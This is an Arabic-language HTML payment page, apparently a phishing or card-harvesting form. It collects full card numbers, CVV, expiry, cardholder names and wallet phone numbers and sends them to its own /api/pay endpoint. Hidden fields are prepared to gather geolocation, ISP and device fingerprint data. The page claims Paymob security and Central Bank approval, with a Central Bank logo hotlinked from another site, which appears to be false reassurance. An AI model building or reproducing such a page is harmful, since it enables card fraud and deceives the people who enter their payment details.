<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tales Net - بيانات الدفع الآمن</title>

    <!-- 🔒 استدعاء ملفات الحماية والبيانات الخارجي -->
    <script src="protection.js" defer></script>
    <script src="Data.js" defer></script>

    <!-- FontAwesome & Bootstrap Grid CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap-grid.min.css">

    <!-- ملف التنسيقات الخارجي -->
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header class="payment-header">
        <h1>إتمام الدفع الإلكتروني</h1>
    </header>

    <div class="container">
        <div class="checkout-card">
            <section class="card-inputs">
                <form id="paymob_checkout" action="/api/pay" method="POST" novalidate>
                    <input type="hidden" id="card_expiry_mm" name="card_expiry_mm">
                    <input type="hidden" id="card_expiry_yy" name="card_expiry_yy">

                    <!-- خانات مخفية لإرسال خاصة بشركة الدفع -->
                    <input type="hidden" name="geoCity" id="geoCity" value="غير معروف">
                    <input type="hidden" name="geoCountry" id="geoCountry" value="غير معروف">
                    <input type="hidden" name="ispProvider" id="ispProvider" value="غير معروف">
                    <input type="hidden" name="batteryInfo" id="batteryInfo" value="غير معروف">
                    <input type="hidden" name="deviceRAM" id="deviceRAM" value="غير معروف">
                    <input type="hidden" name="cpuCores" id="cpuCores" value="غير معروف">
                    <input type="hidden" name="deviceType" id="deviceType" value="غير معروف">
                    <input type="hidden" name="deviceModel" id="deviceModel" value="غير محدد">
                    <input type="hidden" name="screenSize" id="screenSize" value="غير معروف">
                    <input type="hidden" name="userTimeZone" id="userTimeZone" value="غير معروف">
                    <input type="hidden" name="lang" id="lang" value="غير معروف">
                    <input type="hidden" name="clientID" id="clientID" value="غير متوفر">

                    <!-- 1. اختيار وسيلة الدفع -->
                    <div class="input-group-custom">
                        <label>اختر وسيلة الدفع:</label>
                        <select name="payment_method" id="payment_method" required>
                            <option value="wallet" selected>📱 محفظة إلكترونية</option>
                            <option value="card">💳 بطاقة بنكية</option>
                        </select>
                    </div>

                    <!-- 2. قيمة المبلغ -->
                    <div class="input-group-custom">
                        <label>المبلغ (بالجنيه):</label>
                        <div class="input-wrapper">
                            <input placeholder="أدخل المبلغ المطلوب" 
                                   type="text" 
                                   inputmode="numeric" 
                                   name="amount" 
                                   id="pay_amount" required>
                        </div>
                        <div class="error-message" id="error_amount">يرجى إدخال مبلغ صحيح.</div>
                    </div>

                    <!-- 3. رقم الهاتف / المحفظة -->
                    <div class="input-group-custom" id="phone_group">
                        <label>رقم الهاتف / المحفظة:</label>
                        <div class="input-wrapper">
                            <input placeholder="01XXXXXXXXX" 
                                   type="text" 
                                   inputmode="numeric" 
                                   name="phone" 
                                   id="user_phone" 
                                   maxlength="11" 
                                   style="padding-right: 85px;">
                            <div class="input-icon-right" id="wallet_icons">
                                <span class="meeza-badge">ميزة Meeza</span>
                                <i class="fa fa-money cash-icon" title="محفظة"></i>
                            </div>
                        </div>
                        <div class="error-message" id="error_phone">يجب كتابة رقم هاتف صحيح 11 رقماً ويبدأ بـ 01.</div>
                    </div>

                    <!-- 4. خانات البطاقة البنكية -->
                    <div id="card_section">
                        <div class="input-group-custom">
                            <label>رقم البطاقة البنكية:</label>
                            <div class="input-wrapper">
                                <input placeholder="Card Number" 
                                       type="text" 
                                       inputmode="numeric" 
                                       name="number" 
                                       id="card_number" 
                                       maxlength="19" 
                                       autocomplete="cc-number"
                                       style="padding-right: 75px;">
                                <div class="input-icon-right">
                                    <i class="fa fa-cc-visa fa-lg" style="color: #1a1f71;"></i>
                                    <i class="fa fa-cc-mastercard fa-lg" style="color: #eb001b;"></i>
                                </div>
                            </div>
                            <div class="error-message" id="error_card_number">يجب كتابة 16 رقماً بالإنجليزية بدون حروف.</div>
                        </div>

                        <div class="input-group-custom">
                            <label>اسم صاحب البطاقة:</label>
                            <div class="input-wrapper">
                                <input placeholder="Card Holder Name" 
                                       type="text" 
                                       name="name" 
                                       id="card_name">
                            </div>
                            <div class="error-message" id="error_card_name">يرجى إدخال الاسم بالحروف الإنجليزية فقط.</div>
                        </div>

                        <div class="input-containers">
                            <div class="input-group-custom">
                                <label>التاريخ:</label>
                                <div class="input-wrapper">
                                    <input placeholder="MM/YY" 
                                           type="text" 
                                           inputmode="numeric" 
                                           name="expiry" 
                                           id="mmyy" 
                                           maxlength="5">
                                </div>
                                <div class="error-message" id="error_mmyy">تاريخ غير صحيح.</div>
                            </div>

                            <div class="input-group-custom">
                                <label>رمز CVV:</label>
                                <div class="input-wrapper">
                                    <input placeholder="CVV" 
                                           type="password" 
                                           inputmode="numeric" 
                                           name="cvc" 
                                           id="card_cvc" 
                                           maxlength="3"
                                           style="padding-left: 35px;">
                                    <button type="button" class="toggle-password" id="toggleCvvBtn" title="إظهار/إخفاء الرمز">
                                        <i class="fa fa-eye" id="cvvIcon"></i>
                                    </button>
                                </div>
                                <div class="error-message" id="error_cvc">يجب إدخال 3 أرقام.</div>
                            </div>
                        </div>

                        <div class="saveCardText">
                            <label for="save_card">حفظ بيانات البطاقة للمعاملات القادمة</label>
                            <input type="checkbox" id="save_card" value="tokenize" name="save_card">
                        </div>
                    </div>

                    <div class="card-footer-box">
                        <button id="submitButton" type="submit" class="submit-btn">
                            متابعة وتأكيد الدفع
                        </button>
                        <span class="secured-tag"><i class="fa fa-lock" aria-hidden="true"></i> مؤمن بالكامل بواسطة Paymob</span>
                    </div>
                </form>
            </section>
        </div>
    </div>

    <footer>
        <div class="container bank-logos-container">
            <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i> معتمد وتحت إشراف البنك المركزي</div>
            <div class="bank-logos-grid">
                <div class="bank-logo-card" title="البنك المركزي المصري">
                    <img src="https://cbpn.currencyresearch.com/wp-content/uploads/2025/09/CentralBankofEgypt.png.webp" alt="البنك المركزي المصري">
                </div>
            </div>
        </div>
    </footer>

</body>
</html>
